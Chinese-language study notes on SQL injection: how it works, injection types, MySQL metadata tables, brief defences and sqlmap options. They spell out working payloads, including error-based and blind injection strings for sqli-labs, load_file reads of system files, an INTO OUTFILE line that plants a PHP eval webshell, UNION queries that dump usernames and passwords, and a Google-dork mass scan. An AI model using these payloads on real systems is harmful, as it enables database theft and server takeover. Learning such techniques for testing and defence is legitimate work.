
摘要：主要是围绕一些函数运用的
 关键词：   
    SQL（结构化查询语言，一种特殊的编程语言，用于数据库中的标准数据查询语言。与关系型数据库系统进行交流的语言。大多数情况下，SQL 语句独立于DBMS 存在，但同时，每种DBMS 的特性和对SQL 个性化支持。

一、SQL
       1.什么是SQL注入
            一种将SQL语句插入或添加到应用（用户）的输入参数中的攻击，之后再将参数传递给后台的SQL服务器加以解析并执行
            
            Web架构
            
       2.漏洞原理
                两个原因叠加造成的：
            1）程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句
               2）没有进行足够的过滤，将参数内容拼接进入到SQL语句中
       3.危害
              读取（窃取）数据库中信息，脱库
              修改或插入数据
              获取WebShell
              提升权限，与数据库有关。
       4.分类和利用
               按照数据分类
                    数字型注入
                    字符型注入（引号闭合问题，必要时注释掉后面的内容
                         MYSQL中的注释>>  --+    URL编码转换  %23
               按照注入手法分类
                      联合查询 union select（判断当前表中字段列的个数
                                *等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起
                                注意：两张虚拟表的列数相同 字段类型相同
                      报错注入>>利用数据库的报错信息进行注入（详看基于报错的SQL注入详细解析
                       @    group by
                            关于group by 聚合函数的报错，是MySQL 的一个bug 编号为#8652。当使用rand() 函数进行分组聚合时，会产生重复键的错误。
?id=1' and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+
                        @    extractvalue           
and extractvalue(1,concat('^',(select database()),'^'))      
                        @    updatexml              
  and updatexml(1,concat('^',(select current_user()),'^'),1)  current_user()当前用户名--常见MYSQL函数及其说明
                        布尔盲注
                             lenth（）    计算字符转的长度   >>可以用这个计算数据库名字长度
                             substr（1，2，3）     字符串截取函数
                                    1   被查找的字符串
                                    2   从第几位开始截取
                                    3   截取多少位
                                        substr(database(),1,1)   ord（）返回字符穿的ASCII码
                          例：
Less-08      判断长度是不是=8   在判断每一个字符对所对应ASII码中字是否正确
        /Less-8/?id=1' and length(database())=8--+    数据库名字的长度是8
        /Less-8/?id=1' and ord(substr(database(),1,1))=115--+   
            数据库名字的ASCII码
            115        101
                s        e
                        时间盲注 
                                if(1,2,3,)    if判断段
                                    1 表达式，如果表达式的值为真，返回2，若为假返回3
                                sleep（x）  让数据库沉睡X秒
                                F12控制平台网络查看是否沉睡
                                例：
!    Less-09
        /Less-9/?id=1' and sleep(5)--+
        /Less-9/?id=1' and if(length(database())=8,sleep(5),0)--+
        /Less-9/?id=1' and if(ord(substr(database(),1,1))=100,sleep(5),0)--+
        /Less-9/?id=1' and if(ord(substr(database(),1,1))=115,sleep(5),0)--+
                        读写文件的利用   load_file()
 load_file('C:\\Windows\\System32\\drivers\\etc\\hosts')  双斜线转义
 load_file('C:/Windows/System32/drivers/etc/hosts')
 load_file(0x433a2f57696e646f77732f53797374656d33322f647269766572732f6574632f686f737473)
?id=-36 +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,'<?php eval($_POST[666]) ?>',12,13,14,15 into outfile 'c:/xampp/htdocs/1.php' 要知道文件的绝对路径
插入命令则可以实现     
       
                
       5.如何判断SQL注入漏洞和方法的选择
                1） id=1       判断有无回显
                2）id=1'       判断有无报错
                3)   id=1  and 1=1       id=1 and 1=2 判断有无布尔类型的状态
                    报错注入
         6.注入手法的选择
                有无回显     有回显    联合查询
                有无报错     有报错    报错注入
                有无布尔类型   有      布尔盲注
                绝招                            时间盲注（延时注入）        
         7.注入的模式模板  payload
                 注入的手法固定的
二、注入流程
        首先获取数据库的名字>库中表明>>表中列（字段）名>>字段内容
三、MYSQL数据库的特性
            information_schema            元数据数据库（库名、表名、字段名）
            |
            `--tables                存储了所有的表的名字
            |    |    
            |    `--table_schema        表所属数据库的名字
            |    |
            |    `--table_name        表的名字
            |
            `--columns                存储了所有字段的名字
                |
                `--column_name        字段的名字
                |
                `--table_name        字段所属表的名字
                |
                `--table_schema        字段所属库的名字

四、联合查询
        联合查询
        @    查当前数据库的名字
?id=-36 +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,database(),12,13,14,15

            cms
        @    当前库中所有表的名字
?id=-36 +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,hex(group_concat(table_name)),12,13,14,15 from information_schema.tables where table_schema=database()
        group_concat(table_name)显示同一组的内容  
        hex将显示的内容进行十六进制编码 php识别不出来
               转换为十六进制是避免过滤一些特殊符号     
        @    cms_users 表中所有的字段名
?id=-36 +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,hex(group_concat(column_name)),12,13,14,15 from information_schema.columns where table_schema=database() and table_name='cms_users'
         @    脱库
?id=-36 +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,concat(username,0x3a,password),12,13,14,15 from cms_users
五、
        @    根据提交的方法分类
            GET 注入
            POST 注入
            Cookie 注入
            
        @    注入点的位置
            URL
            搜索框
            订单
            留言板
        @    其他分类
            宽字节注入
            堆叠查询
            base64注入        base64 编码方式        编码的规则？
六、防御
         @    安装WAF    Web Application Firewall
        @    过滤敏感字符串
        @    将SQL 语句预编译 PDO
        @    存储过程   
七、sqlmap   
        
    sqlmap 重要常用参数  
        -u/--url            检测注入点
        sqlmap -u "http://172.18.199.91/cms/show.php?id=36";
        --dbs            所有数据库名        
        --current-db    当前数据库的名字
        -D                指定一个数据库
        --tables        列出所有的表名
        -T                指定一个表
        --columns        列出字段名
        -C                指定字段
        --dump            列出内容
sqlmap -g "php?id="谷歌黑客语句批量去找注入点


ZKME                                            
SQL注入原理和危害，怎么防御
SQL基本注入手法、注入手法的选择
通过SQL注入，如何得到数据

